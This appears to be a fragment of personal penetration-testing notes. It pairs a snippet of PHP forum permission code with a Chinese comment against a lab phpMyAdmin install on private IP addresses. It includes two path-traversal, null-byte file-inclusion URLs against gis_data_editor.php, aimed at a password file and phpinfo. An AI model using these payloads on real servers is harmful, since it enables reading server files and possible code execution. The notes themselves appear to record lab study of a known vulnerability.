 elseif($action == 'grouppermission') {

	require_once './include/forum.func.php';
	require_once language('misc');
	$permlang = $language;
	unset($language);
	
	$searchgroupid = isset($searchgroupid) ? intval($searchgroupid) : $groupid;
	$groups = $grouplist = array();
	$query = $db->query("SELECT groupid, type, grouptitle, radminid FROM {$tablepre}usergroups ORDER BY (creditshigher<>'0' || creditslower<>'0'), creditslower");
	$cgdata = $nextgid = '';

定义一个数组groupids，遍历gid









http://172.16.12.114/pentest/cve/phpmyadmin/index.php?db=&table=&server=1&target=&token=85e48a1bf8bdfb8a35131ef6ced0dc56#PMAURL-0:index.php?db=&table=&server=1&target=&token=85e48a1bf8bdfb8a35131ef6ced0dc56





http://192.168.6.128/pentest/cve/phpmyadmin/gis_data_editor.php?token=4a29dda3c4ec2e7b9deee7f42b90e1b8&gis_data[gis_type]=/../../../password%00



gis_data_editor.php?token=4a29dda3c4ec2e7b9deee7f42b90e1b8&gis_data[gis_type]=/../../../phpinfo%00


![image-20220302115147186](C:/Users/LanT34m/AppData/Roaming/Typora/typora-user-images/image-20220302115147186.png)